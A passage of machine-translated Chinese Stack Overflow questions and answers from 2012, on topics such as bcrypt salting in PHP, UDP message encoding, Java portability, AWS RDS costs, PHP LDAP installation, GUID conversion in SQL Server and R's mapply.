   public SalesUser(User user)
   {
      //initialize this instance using the User object
   }
}

//the above allows you to do this:
mySalesUser = new SalesUser(myUser);

//and it also allows the definition of a method like this,
//which requires the generic to be an IUser and also requires a constructor with a User
public void DoSomethingWithIUser<T>(User myUser) where T:IUser, new(User)
{ 
    //...which would allow you to perform the "conversion" by creating a T:
    var myT = new T(myUser);
} 
```

现在，静态成员不满足接口定义，接口不能定义静态成员或构造函数签名。这告诉我，IUser 接口不应该尝试定义转换方法；相反，需要某种 IUser 的方法可以简单地指定它，并且用户可以根据需要提供一个实现，而该实现不需要知道它可以转换为自身。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T19:05:13.390

请记住，接口定义了一个类及其成员而不提供任何实现，您可以创建一个接口，但该接口必须具有实现类。

# sockets - 将消息格式编码到缓冲区以通过 UDP 套接字发送？

> ID：10078192
> 
> 赞同：0
> 
> 时间：2012-04-09T18:54:55.670
> 
> 标签：sockets, chat, distributed-system

作为我们项目的一部分，我们需要决定如何在数据报包中使用套接字发送结构。为了做到这一点，我们不应该通过任何第三方库使用任何序列化。我想出的是将结构字段编码到缓冲区中。

例如。

```
struct message {
   int sequence_number;
   string datamessage;
} 
```

现在要发送这个结构，我们会将它编码到一个类似于这样的缓冲区

> /s"sizeofmessage"/i"sequence_number"/data"datamessage"

有没有更好的方法来实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T22:22:29.667

只要格式包含足够的信息让接收端重建`struct message`.

我发现您提出的格式不是很清楚：

```
/s"sizeofmessage"/i"sequence_number"/data"datamessage" 
```

我不知道你的意思是那些引号在消息中确实存在，我不知道你的意思是消息的大小和序列号应该被编码为 ASCII 中的十进制字符串还是其他的东西.

您应该决定您的协议是否需要以允许接收者识别更新的消息格式的方式进行扩展，以防将来添加更多字段。您需要决定是硬编码只处理上面介绍的非常简单结构的东西，还是想要更灵活的东西来处理不同的结构。请记住，您的序列化格式越具有可扩展性和灵活性，您就越容易改变不使用现成序列化库的决定。

但是假设你想保持它非常简单并设计一些只处理这个特定结构的东西。

以下是适用于您的情况的非常简单的方法：

*   发送序列号。例如：
    *   作为网络字节顺序（大端）的 4 字节整数。
    *   作为带有数字的十进制数，以 ASCII 形式发送，以您选择的非数字字符结尾，例如`' '`（空格）
    *   （或其他任何可以明确解码的东西）
*   将字符串作为字节序列发送。

因为您使用的是 UDP（数据报套接字），所以您不需要发送字符串的长度或使用任何类型的特殊字符终止它。接收方将知道序列号解码后数据包中的所有剩余字节构成字符串。

只要您的消息都适合单个 UDP 数据包（即它们不大于大约 64 KB），这就会起作用。

# java - 为什么你必须为 Windows 和 Linux 编写单独的程序

> ID：10078193
> 
> 赞同：0
> 
> 时间：2012-04-09T18:54:58.953
> 
> 标签：java, linux, architecture, compiler-construction

我一直想知道为什么某些语言（例如 Java）可以在两个 Linux 上运行而对代码几乎没有修改，但其他语言几乎必须重新编写所有代码。为什么是这样？因为内核？

抱歉，如果这是一个简单的问题，但我真的没有太多线索。

另外，就Linux而言，cpu架构之间有什么区别。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T18:57:41.500

从技术上讲，你错了。

Java 不能在 Linux 上运行。它也不能在 Windows 上运行。它也不能在 Mac 上运行，也不能在任何其他类 Unix 操作系统上运行。就此而言，它不在任何操作系统上运行。

它直接在机器上运行。它只适用于一种类型的机器——Java 虚拟机。幸运的是，Java 虚拟机已经被虚拟化到 Linux、Windows、Mac 等平台上。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-09T19:04:23.510

这是一个很长的故事，但本质上是：

1.  二进制可执行文件始终依赖于平台。通常我们说 OS+Architecture 来表示平台。示例：Windows x86、Linux x86-64 等。这是因为它们主要在操作系统的帮助下执行，这些操作系统为可用硬件提供抽象。
2.  字节码（不可执行）可解释文件可以独立执行，因为它们是由已经安装在机器上的*二进制平台相关文件**解释的。*

 *Java 代码被转换为字节码可解释文件 (.class)。它由可以安装在 Windows、Linux、Mac 平台上的依赖于平台的 Java 虚拟机解释和执行。

但是，您可以努力使您的 C/C++**代码**非常独立于平台，但是由于您有不同的操作系统（有时是不同的体系结构），您必须在每个要运行它的系统上编译（相同的）代码，以便构建将在该特定机器上运行的正确二进制文件。

OBS：为了使您的代码更加独立，您应该使用所有系统上都可用的库。

OBS2: To know more about executable files a good "questions" with good "answers" is: [What does executable file actually contain?](https://stackoverflow.com/questions/2048052/what-does-executable-file-actually-contain)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-09T18:57:15.700

因为 Java 不是编译成机器码，而是编译成由 JVM（Java 虚拟机）执行的字节码，它负责操作系统的细节（并为 Java 程序提供操作系统功能的统一接口）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T18:58:24.030

Java 建立在称为 Java 虚拟机或 JVM 的虚拟计算机上。只要在计算机上正确实现了 JVM，所有 Java 程序都应该毫不费力地在其中运行。需要注意的是，代码本身是否包含特定于操作的项目，例如硬编码的路径名（例如，这些在 Unix 和 Windows 之间有所不同。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-09T18:58:33.483

问题不在于语言，而在于使用的库。我从事一个项目，该项目在 Windows 和 Linux 上轻松使用 99% 的相同代码。我们可以这样做是因为我们使用了具有 Windows 和 Linux 实现的库。这些库封装了特定于平台的代码。Java 也是如此：它有一个标准库，在每个平台上都以不同的方式实现。*

# facebook - 链接下载适用于 Mac OSX 的 facebook SDK？

> ID：10078195
> 
> 赞同：1
> 
> 时间：2012-04-09T18:55:02.913
> 
> 标签：facebook, macos, sdk

嗨，我是 facebbok SDK 的新手。我需要为 Mac OSX 下载 facebook SDK。请向我提供确切的链接和使用它的步骤。

谢谢，卡皮尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:05:46.773

Facebook 还没有发布 MAC OS X SDK，
你可以在这里找到 Facebook SDK 和其他开源项目，
[https://github.com/facebook](https://github.com/facebook)

构建 MAC OS X 应用程序的另一种方法是使用 PhoneGap

**Mac 上的 PhoneGap（桌面）** [https://github.com/shazron/phonegap-mac](https://github.com/shazron/phonegap-mac)

或者您可以使用**Titanium Studio**
[http://www.appcelerator.com/products/titanium-studio/](http://www.appcelerator.com/products/titanium-studio/)

他们都可以构建本机mac应用程序。

# php - bcrypt 怎么加盐？

> ID：10078197
> 
> 赞同：1
> 
> 时间：2012-04-09T18:55:14.660
> 
> 标签：php, salt, crypt, bcrypt

在安全方面我是个新手，我一直在阅读[php crypt](http://php.net/manual/en/function.crypt.php)并寻找好的建议，尽管没有人真正详细说明“如何”以最有效的方式进行操作。

我做了一个测试登录，它使用这样的东西：

```
 //verify login from user input
$username = mysql_real_escape_string($_POST['username']);
$salt = '$2a$10$cdDegHjJLPUvVXYz23679.MOetNHBk9NTStpY9YjJWiL5ECfhHlSm';
$password = crypt(mysql_real_escape_string($_POST['password']), $salt); 
```

（我确信我需要更改很多内容以使其完全安全（例如限制密码字符串长度）请告诉我您认为有什么好的做法）

我在某处读到，制作随机盐并将其与密码一起存储是理想的，（我不完全理解检查与密码无关的数字的概念）

然后我在某处读到，随机加盐是没有意义的，因为它不会增加安全性，而静态盐的作用几乎相同。

我看到本[教程](http://www.gregboggs.com/php-blowfish-random-salted-passwords/)使用带有 $_GET 的随机盐。（告诉我这是不对的）

有人可以指出我的正确方向，使我的 bcrypt 尽可能有效。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:50:31.240

为每个密码使用随机盐**很**重要。PHP 的`crypt()`函数实现会自动将其包含在生成的哈希值中，因此存储它的位置没有问题，但它应该从随机源正确生成。

我[在 PHP 中写了一篇关于 bcrypt 的小文章](http://www.martinstoeckli.ch/php/php.html#ssl_bcrypt)，因为我认为了解函数的工作原理很重要。一旦我们理解了它，我们就可以使用一个完善的库，比如[phpass](http://www.openwall.com/phpass/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:12:19.317

[在此处](https://stackoverflow.com/questions/7029372/)查看我在此线程上的旧答案。有一篇有趣的文章和 phpass 的链接。

# android - Android - 在线与离线解析 - 电池

> ID：10078199
> 
> 赞同：0
> 
> 时间：2012-04-09T18:55:22.087
> 
> 标签：android, parsing, power-management

我需要执行以下操作： - 获取一个文本文件。- 阅读每行的第一个单词并使用哈希图计算每种类型。- 使结果到达服务器。

我的问题是，您认为哪种电池更节能？

1.  在 Android 设备上解析文件并将生成的 hashmap 发送到服务器。

2.  将完整的文件发送到服务器（使用 gzip 压缩）并在线进行解析。再次将结果检索到手机。

** 文件大小可以从 100kB 到 5MB

我已经实现了选项 A，效果很好：即使对于大文件，也可以在几毫秒内完成解析。

发送结果（只是 200 个整数的列表）需要稍长一些的时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T18:58:44.090

直觉说，因为解析听起来很简单，而且网络很昂贵，所以你应该在手机上进行计算。

但实际上，只有一种方法可以找到，因为情况（文件、解析需求等）是这里的主要问题，是测试。运行测试。多。报告您发现的内容：D

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T14:19:05.357

我没有提供稳定的结果。我的实验只包括连续尝试两种替代方案 50 次，并监听电池变化。

两种情况下的结果非常相似： - 在手机中解析 1MB 文件并发送结果，然后等待 OK（50 次） - 将 1MB 文件发送到服务器，在那里解析并取回结果。我希望在离线解析中获得更好的结果，实际上它们稍微有点，但并没有明显好转。经过多次测试，甚至有时在线解析更好。

解析只是读取每行的第一个单词并将其存储在 Map 中。所有网络通信均通过WIFI完成。

由于结果非常相似，因此在这种情况下离线解析更好，因为您不必依赖网络连接。尽管如此，如果其他人面临同样的问题，我建议像我一样测试这两种选择，因为我觉得结果可能因情况而异。

# css - 这个 CSS 字体系列如何正确显示“经济学”？

> ID：10078202
> 
> 赞同：6
> 
> 时间：2012-04-09T18:55:27.617
> 
> 标签：css, fonts, font-face

在此页面上：[http](http://www.anasiamusic.com/bio.html) : //www.anasiamusic.com/bio.html 在正文中（“Ana Sia 的 DJ 板条箱是一个股票...”），其`font-family`属性`<div>`指定为：

```
font-family: 'Economica', sans-serif 
```

我想知道这是如何工作的——即使在 Internet Explorer 中，在 IE7 查看模式下，它仍然按预期显示。我一直坚持使用 Georgia、Verdana 等 Web 安全字体，尤其是用于正文复制的其他字体，我的印象是，要完成这样的事情并使其跨平台兼容，必须使用`@font-face`.

显然我错了，有人可以解释并指出一些关于网络排版的好资源，可以进一步阐明吗？

请注意，我的计算机（Windows 7）上没有安装 Economica。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T18:57:29.937

Economica 由[Google Web Fonts](http://www.google.com/webfonts)提供（[链接到字体样本](https://www.google.com/webfonts/specimen/Economica)）。

它是通过这个`<link>`标签加载的，你可以在页面标题中找到它：

```
<link href='http://fonts.googleapis.com/css?family=Economica:700' rel='stylesheet' type='text/css'> 
```

然后由支持 CSS 规则的浏览器嵌入`@font-face`，以便它们可以在页面中呈现它。`@font-face`您可以在[CSS3 规范](http://www.w3.org/TR/css3-fonts/#font-resources)中阅读更多信息。

Google Web Fonts 利用该规则以及适当的格式来告诉浏览器嵌入字体。浏览器然后下载字体并尝试以它们理解的格式呈现它，如果失败，它们将退回到堆栈中接下来出现的任何内容（在这种情况下，泛型系列`sans-serif`）。这就是它的全部，真的。

最终下载的字体格式取决于浏览器：现代浏览器只需要下载[WOFF](https://en.wikipedia.org/wiki/Web_Open_Font_Format)格式，而像 IE7 这样的旧浏览器接收不同的格式，称为 EOT（从 IE4 开始支持！）以便也嵌入字体。其他浏览器的早期版本可能会选择其他格式，例如 TTF、OTF 甚至 SVG。`@font-face`您可以在有关防弹语法的文章中阅读有关各种格式及其用途的更多信息，例如[这篇](http://www.fontspring.com/blog/the-new-bulletproof-font-face-syntax)文章。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T11:43:15.997

我用不同的字体也有类似的问题。我所做的是[在这里](http://fontjazz.com/)使用这个网站并按照说明进行操作。事实证明，Font Jazz 将所有字体类型转换为网络安全。使用起来也相当简单；只有两个js文件。

希望有帮助！

# sql-server - 无法手动调试存储过程

> ID：10078203
> 
> 赞同：0
> 
> 时间：2012-04-09T18:55:43.690
> 
> 标签：sql-server, sql-server-2008, stored-procedures

我在使用 SQL Server Management Studio 2008 调试存储过程时遇到问题。我按了 ALT+F5 并收到“查询已成功执行”消息。它没有达到任何断点。你能告诉我可能是什么问题吗？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:00:15.677

很可能是防火墙问题，或者您没有调试权限

这也可能为您提供一些见解

[http://msdn.microsoft.com/en-us/library/w1bhybwz(v=VS.80).aspx](http://msdn.microsoft.com/en-us/library/w1bhybwz(v=VS.80).aspx)

[http://msdn.microsoft.com/en-us/data/hh297027](http://msdn.microsoft.com/en-us/data/hh297027)

# amazon-rds - 如何减少我的 AWS RDS 实例的账单

> ID：10078204
> 
> 赞同：4
> 
> 时间：2012-04-09T18:55:58.573
> 
> 标签：amazon-rds

我们目前每月为 RDS 使用支付 85-100 美元。但大多数时候我们不访问我们的数据库实例。有没有办法通过关闭实例或进入共享数据库模式来减少账单。存在什么样的替代方案？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:07:53.323

您可以随时使用[DeleteDBInstance](http://docs.amazonwebservices.com/AmazonRDS/latest/APIReference/API_DeleteDBInstance.html)删除实例。默认情况下，将创建最终快照。然后，您可以稍后重新创建它。请参阅[此常见问题解答](http://aws.amazon.com/rds/faqs/#27)。最终的快照存储成本为每月每 GB 0.15 美元。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T17:14:17.527

甚至我也面临这个问题。使用 AWS；RDS 比 EC2 实例贵得多。与可以优化的 EC2 实例相比，在我的情况下，数据库需要 24*7 运行。

我选择降低 RDS 成本的方法是选择“预留实例”。无论如何，RDS 是我永远需要的东西（直到我在 AWS 上）。通过这种方式，我可以将成本降低约 50%。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-05-16T14:20:31.257

AWS 添加了在您不使用 RDS 实例时[关闭（但不是删除！）它们的功能。](https://aws.amazon.com/about-aws/whats-new/2017/06/amazon-rds-supports-stopping-and-starting-of-database-instances/)这样，您只需为数据存储付费，这比实际运行的数据库便宜得多。您可以使用[AWS Instance Scheduler](https://aws.amazon.com/answers/infrastructure-management/instance-scheduler/)按计划自动关闭 RDS 数据库和 EC2 实例，例如在非生产环境中的晚上和周末。

[您可以在AWS Production Readiness Checklist](https://gruntwork.io/devops-checklist/)中找到更多信息以及其他 AWS 成本优化技巧。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-06-14T09:39:33.963

您可以利用多种选项来降低 RDS 成本。您提到您大部分时间都没有使用您的 RDS 实例，因此这是寻找节省的第一个显而易见的地方：

1.  如果您仅在每天 8 小时的 09:00 - 17:00 使用实例，请设置计划作业以在 17:00 关闭实例并在 09:00 重新启动它。

2.  查看无服务器 RDS 实例。他们在闲置期后关闭。但是，您应该知道，如果您将监控挂钩到您的 RDS 实例，监控将创建足够的工作负载以防止实例进入休眠状态，因此它仅适用于非常狭窄的用途，需要考虑得很仔细。

3.  如线程中其他地方所述，切换到 EC2 实例并管理您自己的数据库。与类似规格的 RDS 实例相比，这将为您节省大约一半的成本。

对于更细粒度的节省方法，您可能需要查看我的一位同事撰写的关于[降低 AWS 中的 RDS 成本的](https://shatteredsilicon.net/blog/2021/06/10/how-to-reduce-rds-costs-on-aws/)这篇文章。

# php - 无法在 PHP 中加载 LDAP 函数

> ID：10078205
> 
> 赞同：2
> 
> 时间：2012-04-09T18:56:03.267
> 
> 标签：php, apache, redhat, openldap

尝试使用[`ldap_connect()`](http://php.net/ldap_connect)时，我收到此错误：

> 致命错误：调用未定义函数 ldap_connect()

我在启用 LDAP apache 模块的情况下重新编译了 php，并且我也编辑了我的 php.ini 文件并取消了注释：

```
extension=php_ldap.dll 
```

我在 Red Hat Linux、php 5.3.10、apache 2.2 上。有任何想法吗？

**加载的 Apache 模块：（包含 *util_ldap*）**

core mod_authn_file mod_authn_default mod_authz_host mod_authz_groupfile mod_authz_user mod_authz_default mod_auth_basic mod_include mod_filter util_ldap mod_log_config mod_logio mod_env mod_expires mod_headers mod_setenvif mod_version mod_proxy mod_proxy_connect mod_proxy_ftp mod_proxy_http mod_proxy_scgi mod_proxy_ajp mod_proxy_balancer mod_ssl prefork http_core mod_mime mod_status mod_autoindex mod_asis mod_info mod_suexec mod_cgi mod_negotiation mod_dir mod_actions mod_userdir mod_alias mod_rewrite mod_so mod_auth_passthrough mod_bwlimited mod_fpcgid mod_php5 mod_security

**Apache 协议：（包含：*ldap*）**

字典，文件，ftp，ftps，gopher，http，https，imap，imaps，ldap，ldaps，pop3，pop3s，rtsp，smtp，smtps，telnet，tftp

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-15T14:22:50.007

你写：

> 尝试使用 ldap_connect() 时，出现此错误：
> 
> 致命错误：调用未定义函数 ldap_connect()

您收到此错误是因为未定义函数[`ldap_connect`^(*Docs 。*)](http://php.net/ldap_connect)您不能在 PHP 中调用未定义的函数，这就是您看到致命错误的原因。

要定义该函数，您需要加载[一个名为`LDAP`](http://www.php.net/manual/en/book.ldap.php). 它带有[安装说明](http://www.php.net/manual/en/ldap.installation.php)。你写了：

> 我重新编译了启用 LDAP apache 模块的 php。

如果您重新编译 PHP，请确保启用 LDAP，请参阅：

> `--with-ldap[=DIR]`在编译 PHP 以启用 LDAP 支持时，您将需要使用配置选项。DIR 是 LDAP 基本安装目录。

但是，通常只需通过包管理器安装您需要的东西就足够了，例如尝试：

```
# yum install php-ldap 
```

如果这还不够，并且您实际上需要编辑 PHP 配置（并非总是必要的），请执行以下操作：

```
$ vi /etc/php.ini

add extension=ldap.so

# service httpd restart 
```

我希望这是有帮助的。注意那`.dll`只是窗户。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T00:26:52.217

我强烈建议您使用可以使用 yum 安装的 PHP。根据您的 RH 版本，您可能必须指定您想要 php53（对于 RH < 6）。所以，像这样进行安装：

1.  百胜安装php53
2.  百胜安装 php53-ldap

在这一点上，你应该很高兴。您根本不需要安装任何特殊的 Apache LDAP 库来让 PHP 与 LDAP 一起工作。

如果您使用的是 RH 6，那么您可以跳过名称的 53 部分。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T19:55:09.377

这主要是一种预感，但是您是否尝试过降级到 PHP 5.3.9？

Internet 上有少量关于 LDAP 在 5.3.10 中被破坏的传言。此外，如果您觉得大胆，可以尝试 PHP 5.4。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-29T13:06:02.880

对于 CentO。我已经安装了 PHP 7。所以当我尝试执行时

```
yum install php-ldap 
```

> 有这个错误

```
php71w-common conflicts with php-common-5.4.16-43.el7_4.1.x86_64 
```

要解决此错误并安装 ldap-php，请执行

```
yum install php71w-ldap 
```

服务器将尝试安装 5.6 但我们需要引导服务器安装 7。

如果它不起作用，请尝试在另一个答案中提到的 php.ini 中添加扩展名。

> 并且不要忘记重新启动服务器。

安装完成后，ldap-login 将成功完成。

# java - 从文本文件中提取标记？

> ID：10078207
> 
> 赞同：0
> 
> 时间：2012-04-09T18:56:08.323
> 
> 标签：java, text, token

我希望能够从文本文件中提取文本作为标记 - 例如，假设我有一个包含以下句子的文本文件：

这是一家不错的餐厅，

相信我！

我想将其内容提取为“令牌”-例如，一个令牌将是“It's”，下一个令牌将是“”，之后的一个将是“a”，然后是“”，然后是“good” ，然后是“餐厅”，然后是“，”和“\n”，然后是“相信”、“”、“我”、“！”。所以我想一种说法是标记要么是单词，要么不是单词。

这是我到目前为止所拥有的（我在程序的其他地方检查标记是否是一个单词，这个方法只返回下一个标记）：

```
public Token next() {
  if (c == -1) {
        throw new NoSuchElementException();
    }

  Writer sw=new CharArrayWriter();
  try {
        while ( c != -1 && Character.isLetter(c) ) {
            sw.write(c);
            c = r.read();
        }
        while ( c != -1 && !Character.isLetter(c)) {
            c = r.read();
        }
    } catch (IOException e) {
        c = -1;
        return null;
    }
    return null;
} 
```

现在我将返回值设为“null”，因为我不确定如何使用 writer 将其导出为令牌。有人对此有任何提示吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T18:59:13.080

查看可能适合您需求的 Scanner 类。

[http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html](http://docs.oracle.com/javase/6/docs/api/java/util/Scanner.html)

如果你从你的文件构建一个扫描器，你可以使用这个`next()`方法来获取你的令牌。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:07:19.203

我想使用 Matcher 类的解决方案可以解决您的问题。

```
Matcher m = Pattern.compile("\\p{Alpha}+|\\p{Digit}+|\\p{Punct}+|\\p{Space}+").matcher("It's a good restaurant, believe me!");
while(m.find())
    System.out.println(">"+m.group()+"<"); 
```

也许这个正则表达式可能不是正确的，但你可以构建一个更好的。请参阅以下中的模式文档：

[http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)

# starteam - Starteam - 检出特定变更请求的文件 #

> ID：10078208
> 
> 赞同：0
> 
> 时间：2012-04-09T18:56:09.687
> 
> 标签：starteam

我正在使用 Starteam 2005，并且想知道是否可以签出已签入的任何文件以获取更改请求 #。

例如，CR # 123456 签入了以下文件：

fileA.txt - 修订版 21

fileB.txt - 修订版 199

fileC.txt - 修订版 345

fileD.txt - 修订版 721

fileE.txt - 修订版 444

从那时起，所有文件都被更新了多次，每个文件的修订版都远高于此。我可以打电话给 STCMD 并检查所有为 CR 123456 签入的文件吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T16:07:30.680

为此，您必须使用*StarTeam SDK*，
并编写一个工具（在 Java / Perl / VB / .Net 中）为您获取这些文件修订。

Borland在 StarTeam 的后续版本中引入了*Change-Packets*
， 允许您根据它们所属的*数据包*将更改从一个视图提升到另一个视图*。*

# sql - 从 UniqueIdentifier 转换为 BigInt 并返回？

> ID：10078209
> 
> 赞同：16
> 
> 时间：2012-04-09T18:56:11.700
> 
> 标签：sql, sql-server, sql-server-2008, tsql, uniqueidentifier

```
declare @uu uniqueidentifier =  'C50B0567-F8CC-4219-A1E1-91C97BD9AE1B'
select @uu
declare @zaza bigint = ( select convert(bigint, convert (varbinary(8), @uu, 1)) )
select @zaza
select CONVERT( uniqueidentifier , convert( varbinary(16) , @zaza , 1 ) ) 
```

我以为我有一种快速的方法可以将唯一标识符值转换为 Big Int，然后再转换回来。但是我的第二次转换有一个问题。任何人都可以评论将 GUID 完全转换为数字并返回的正确方法吗？当我尝试将其从数字表示形式转换回其原始 GUID 时，我只获得了 GUID 的一部分，而不是全部。

我想将一个整数（我认为它在 MSSQL 中被归类为“Large BigInt”？）传递给远程系统，只使用字符 0-9，并且仍然获得 NewId() 的随机唯一性。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-04-09T19:38:14.347

您的第二次转换没有问题。当我在 SQL 管理工作室中运行您的 SQL 语句时，我得到：

```
------------------------------------
C50B0567-F8CC-4219-A1E1-91C97BD9AE1B

(1 row(s) affected)

--------------------
7423352504965404994

(1 row(s) affected)

------------------------------------
C50B0567-F8CC-4219-0000-000000000000

(1 row(s) affected) 
```

由于您将 8 字节值转换为 16 字节 guid，因此 guid 的一半将为零，这正是您所看到的。

# android - 使用 NDK 或第三方 API 在语音通话期间播放录制的声音

> ID：10078210
> 
> 赞同：3
> 
> 时间：2012-04-09T18:56:15.203
> 
> 标签：android, android-ndk

我已经探索了很多，以了解如何在 android 的语音通话期间播放预先录制的音频，但我注意到在所有地方，使用当前支持的 API 是不可能的，也没有任何解决方法。

所以我想知道的是有没有人知道如何使用 NDK 或任何其他外部 API 来做到这一点？

我什至试图与提出这个问题的成员重新沟通，但他们中的大多数人都在一年前见过，所以我不得不再次问这个问题。

> 我的主要观点是，如果有人探索过如何使用 NDK 实现这一点，那么请分享路线图来做同样的事情吗？

***更新***

当其他人接听电话时，我尝试在免提电话上播放录制的文件，但即使我在免提电话上播放，音频文件仅在我端播放，而不是在对方端播放。所以这个解决方案不起作用。

# r - 使用多列作为变量与 sapply

> ID：10078211
> 
> 赞同：35
> 
> 时间：2012-04-09T18:56:15.590
> 
> 标签：r, dataframe, apply

我有一个`dataframe`并且我想应用一个函数，该函数采用三列的值并计算三个值之间的最小差异。

```
#dataset
df <- data.frame(a= sample(1:100, 10),b = sample(1:100, 10),c= sample(1:100, 10))

#function
minimum_distance <- function(a,b,c)
{
  dist1 <- abs(a-b)
  dist2 <- abs(a-c)
  dist3 <- abs(b-c)
  return(min(dist1,dist2,dist3))
} 
```

我正在寻找类似的东西：

```
df$distance <- sapply(df, function(x) minimum_distance(x$a,x$b,x$c) )
## errormessage
Error in x$a : $ operator is invalid for atomic vectors 
```

虽然我可以使用 ddply：

```
df2 <- ddply(df,.(a),function(r) {data.frame(min_distance=minimum_distance(r$a,r$b, r$c))}, .drop=FALSE) 
```

这不会保留所有列。有什么建议么？

编辑：我最终使用：

```
df$distance <- mapply(minimum_distance, df$a, df$b, df$c) 
```

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-04-09T19:02:59.773

试试 mapply()：

```
qq <- mapply(minimum_distance, df$a, df$b, df$c) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-09T19:06:28.860

试试这个：

```
do.call("mapply", c(list(minimum_distance), df)) 
```

但您可以编写矢量化版本：

```
pminimum_distance <- function(a,b,c)
{
 dist1 <- abs(a-b)
 dist2 <- abs(a-c)
 dist3 <- abs(b-c)
 return(pmin(dist1,dist2,dist3))
}
pminimum_distance(df$a, df$b, df$c)

# or
do.call("pminimum_distance", df) 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-04-09T21:37:17.910

我知道这已经得到解答，但我实际上会采用一种不同的方法，它采用任意数量的列，并且使用外部方法更通用：

```
vdiff <- function(x){
    y <- outer(x, x, "-")
    min(abs(y[lower.tri(y)]))
}

apply(df, 1, vdiff) 
```

我认为这有点清洁和灵活。

编辑：根据 zach 的评论，我提出了这个更形式化的函数，该函数也适用于具有非数字列的数据帧，方法是删除它们并仅对数字列起作用。

```
cdif <- function(dataframe){
    df <- dataframe[, sapply(dataframe, is.numeric)]
    vdiff <- function(x){
        y <- outer(x, x, "-")
        min(abs(y[lower.tri(y)]))
    }
    return(apply(df, 1, vdiff))
}

#TEST it out
set.seed(10)
(df <- data.frame(a = sample(1:100, 10), b = sample(1:100, 10), 
    c = sample(1:100, 10), d =  LETTERS[1:10]))

cdif(df) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-07-28T04:38:29.343

最好编写一个函数，然后在向量上使用 mapply：

```
 f1 <- function(a,b,c){
 d =abs(a-b)
 e =abs(b-c)
 f= abs(c-a)
 return(pmin(d,e,f))
 }

 qq <- mapply(f1, df$a, df$b, df$c) 
```

# cakephp - CakePHP Bake - 表名中的下划线问题

> ID：10078213
> 
> 赞同：0
> 
> 时间：2012-04-09T18:56:19.610
> 
> 标签：cakephp, cakephp-model, cakephp-bake

我正在尝试烘焙一个使用名为“forecast_counties”的表的模型。我一辈子都无法获得自动烘焙过程来使用这张桌子。

我尝试了以下方法：

```
"cake bake all forecast_county" 
```

“致命错误：在第 162 行的 ../cake/console/libs/bake.php 中找不到类 'ForecastCounty'”

```
"cake bake all ForecastCounty" 
```

“致命错误：在第 162 行的 ../cake/console/libs/bake.php 中找不到类 'ForecastCounty'”

我很确定模型名称应该是单数......为什么我不能让 forecast_counties 表/模型烘烤？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:06:08.707

尝试

```
cake bake all 
```

然后从您要烘焙的列表中选择模型。

或者你可以做

```
cake bake all forecast_counties 
```

您必须使用与要烘烤其模型的表的名称相同的名称。

# javascript - JS隐藏一个div，同时显示另一个

> ID：10078216
> 
> 赞同：1
> 
> 时间：2012-04-09T18:56:38.440
> 
> 标签：javascript, hide, mouseover

因此，我查看了其他问题，虽然它们很有帮助，但我仍然非常困惑。我缺乏 JS/jquery 技能并没有帮助。（这可能是一个愚蠢的问题，但如果我不问我就不会学习）

我在 CF 环境中工作，基本上，我有一个页面。当用户将鼠标悬停在 div 块上时，会出现一个大的 div 块来覆盖这个原始 div。然后，当用户单击关闭链接时，页面将恢复到之前的状态。

所以现在我有：

```
<div onmouseover="getStuff();" style="position:absolute;left:150px;top:255px;width:240px; border:1px solid blue;">
    <div class="title"><b>Title</b><br /><br />Aenean magna sem, fringilla id malesuada nec, facilisis id quam.  </div>
</div> 
```

哪个激活：

```
 <script>
    var iAlreadyGotStuff = 0;
    function getStuff() {
        if (!iAlreadyGotStuff) {
            gsSimpleAjax({url:'ajax.cfm?mode=content', target:'myTarget'});
            iAlreadyGotStuff = 1;
        }
    }

</script> 
```

ajax.cfm 基本上只是拉入一个适合页面主页的表格。

示例：http: [//img441.imageshack.us/img441/8548/exampleyt.png](http://img441.imageshack.us/img441/8548/exampleyt.png)

我需要使用什么 JS 代码或需要更改什么来隐藏 Div 类“标题”我的 Target 处于活动状态的 div 类“myTarget”。

我试过了，但没有用：

```
document.getElementById('title').style.display='none' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T18:59:22.410

向班级添加一个ID，它应该可以工作

```
 <div class="title" id="title"><b>Title 
```

编辑：

[https://developer.mozilla.org/en/DOM/document.getElementById](https://developer.mozilla.org/en/DOM/document.getElementById)

[https://developer.mozilla.org/en/DOM/document.getElementsByClassName](https://developer.mozilla.org/en/DOM/document.getElementsByClassName)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:08:34.150

